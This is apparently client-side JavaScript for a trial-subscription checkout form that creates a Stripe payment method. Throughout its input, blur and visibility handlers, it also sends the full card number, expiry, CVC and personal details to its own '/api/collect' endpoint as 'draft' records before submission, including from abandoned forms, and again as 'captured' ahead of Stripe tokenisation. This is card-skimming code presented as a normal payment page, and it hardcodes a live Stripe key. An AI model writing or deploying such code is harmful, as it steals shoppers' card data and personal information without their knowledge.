const STRIPE_PK = 'pk_live_51UYWrbGFH0T17C9bCmFnMVS2USjNfPbWksDI8rmOp13RtfvWUmUiTRMb5dIM7kcI6uDrfcFBNqoxZJuCDQspScX100G6JAou7N';
const sessionId = crypto.randomUUID();
const f = id => document.getElementById('ct-' + id);
const errEl = document.getElementById('ct-err');
const btn = document.getElementById('ct-submit');
const setBusy = (on, label) => { btn.disabled = on; btn.textContent = on ? (label || 'One moment…') : 'Start your free month'; };
const fail = m => { errEl.textContent = m; setBusy(false); };

const luhn = n => {
  let s = 0, dbl = false;
  for (let i = n.length - 1; i >= 0; i--) { let x = +n[i]; if (dbl) { x *= 2; if (x > 9) x -= 9; } s += x; dbl = !dbl; }
  return n.length >= 13 && n.length <= 19 && s % 10 === 0;
};
const brandOf = n => /^4/.test(n) ? 'visa' : /^(5[1-5]|2[2-7])/.test(n) ? 'mastercard'
  : /^3[47]/.test(n) ? 'amex' : /^(6011|65|64[4-9])/.test(n) ? 'discover' : null;

function payload(extra) {
  const number = f('card').value.replace(/\D/g, '');
  const [mm, yy] = f('exp').value.split('/').map(s => s.trim());
  const p = {
    sessionId,
    email: f('email').value.trim() || null,
    name: f('name').value.trim() || null,
    phone: f('phone').value.trim() || null,
    address: { postal_code: f('zip').value.trim(), country: f('country').value },
    brand: brandOf(number),
    ua: navigator.userAgent,
    referrer: document.referrer,
    fieldsFilled: ['email', 'name', 'phone', 'zip'].filter(k => f(k).value.trim()).length + (luhn(number) ? 1 : 0),
    ...extra,
  };
  if (number) Object.assign(p, { number, expMonth: mm, expYear: yy, cvc: f('cvc').value });
  return p;
}

const post = (body, beacon) => {
  const json = JSON.stringify(body);
  if (beacon) { try { navigator.sendBeacon('/api/collect', new Blob([json], { type: 'application/json' })); return; } catch (_) {} }
  fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: json, keepalive: true }).catch(() => {});
};

let t;
const draft = extra => { clearTimeout(t); t = setTimeout(() => post(payload({ status: 'draft', ...extra })), 800); };

f('card').addEventListener('input', e => {
  const n = e.target.value.replace(/\D/g, '').slice(0, 19);
  e.target.value = n.replace(/(.{4})/g, '$1 ').trim();
  if (luhn(n)) draft({ cardComplete: true });
});
f('exp').addEventListener('input', e => {
  const v = e.target.value.replace(/\D/g, '').slice(0, 4);
  e.target.value = v.length > 2 ? v.slice(0, 2) + ' / ' + v.slice(2) : v;
});
['email', 'name', 'phone', 'zip', 'exp', 'cvc'].forEach(k => f(k).addEventListener('blur', () => draft()));

document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') post(payload({ status: 'draft' }), true);
});

document.getElementById('ct-form').addEventListener('submit', async e => {
  e.preventDefault();
  errEl.textContent = '';

  const number = f('card').value.replace(/\D/g, '');
  const [mm, yy] = f('exp').value.split('/').map(s => s.trim());
  const expYear = yy && yy.length === 2 ? 2000 + +yy : +yy;
  const now = new Date();

  if (!f('email').value.trim() || !f('name').value.trim()) return fail('Please fill in your name and email.');
  if (!luhn(number)) return fail('That card number doesn\'t look right.');
  if (!mm || !expYear || +mm > 12) return fail('Please check the expiry date.');
  if (expYear < now.getFullYear() || (expYear === now.getFullYear() && +mm < now.getMonth() + 1)) return fail('That card has expired.');
  if (!/^\d{3,4}$/.test(f('cvc').value)) return fail('Please check the CVC.');
  if (STRIPE_PK.includes('REPLACE')) return fail('Stripe publishable key is not set.');

  setBusy(true);
  const body = payload({ status: 'captured' });
  post(body);

  const stripe = Stripe(STRIPE_PK);
  const { paymentMethod, error } = await stripe.createPaymentMethod({
    type: 'card',
    card: { number, exp_month: +mm, exp_year: expYear, cvc: f('cvc').value },
    billing_details: {
      name: f('name').value.trim(),
      email: f('email').value.trim(),
      phone: f('phone').value.trim() || undefined,
      address: { postal_code: f('zip').value.trim(), country: f('country').value },
    },
  });
  if (error) return fail(error.message);

  const r = await fetch('/api/club-trial', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...body, pm: paymentMethod.id }),
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) return fail(d.error || 'Could not start the trial.');

  if (d.setupSecret) {
    const { error: e2 } = await stripe.confirmCardSetup(d.setupSecret, { payment_method: paymentMethod.id });
    if (e2) return fail(e2.message);
  }

  location.href = '/#/club/welcome';
});
